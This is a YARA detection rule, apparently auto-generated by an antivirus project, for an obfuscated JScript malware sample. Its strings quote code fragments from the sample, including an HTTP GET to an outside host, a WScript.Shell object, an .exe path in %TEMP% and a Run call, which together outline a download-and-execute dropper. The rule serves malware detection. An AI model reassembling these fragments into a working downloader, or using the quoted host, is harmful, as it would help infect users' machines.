rule sig_20160330_5627e5f4db3b02701c52c02a2b7776c8 {
  meta:
    description = "datamaliciousorder - file 20160330_5627e5f4db3b02701c52c02a2b7776c8.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "c938bbfbded8137e7b0e3ef701674d48205dc67d2ed1bb4d6421e65fba8bdd9c"

  strings:
    $s1  = "_N0[_XO](\"GET\", \"http://linkownia.itcom.pl/s9aps\", false);" fullword ascii
    $s2  = "var _SP = function _GN() {return WScript[_GP](\"WScript\"+\".Shell\");}(), _W0 = 11;" fullword ascii
    $s3  = "function _F(_G, _AF){_IN = _IN * 1; return _G - _AF;};" fullword ascii
    $s4  = "if (_N0[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _K() {return _SP[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"k6w6iGm3LX.ex\" + \"e\";};" fullword ascii
    $s6  = "function _LX(){return _PM + \"\";};" fullword ascii
    $s7  = "function _I(_J){_SP[\"Run\"](_J, _IN, _IN);};" fullword ascii
    $s8  = "function _MQ() {return ((_K0 == true) && (_K0 == _T)) ? 1 : _IN;};" fullword ascii
    $s9  = "function _QV(_W) {var _U = (1, 2, 3, 4, 5, _W); return _U;};" fullword ascii
    $s10 = "function _JS()" fullword ascii
    $s11 = "return _F(_LK, _I0);" fullword ascii
    $s12 = " while (_OM){" fullword ascii
    $s13 = "function _GW(){return _GP;};" fullword ascii
    $s14 = "function _JZ(){return 22;};" fullword ascii
    $s15 = "var _XH = new this[\"Date\"]();" fullword ascii
    $s16 = "var _K0 = false;" fullword ascii
    $s17 = "_K0 = true; " fullword ascii
    $s18 = "var _WJ = false;" fullword ascii
    $s19 = "var _T = false;" fullword ascii
    $s20 = "_T = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}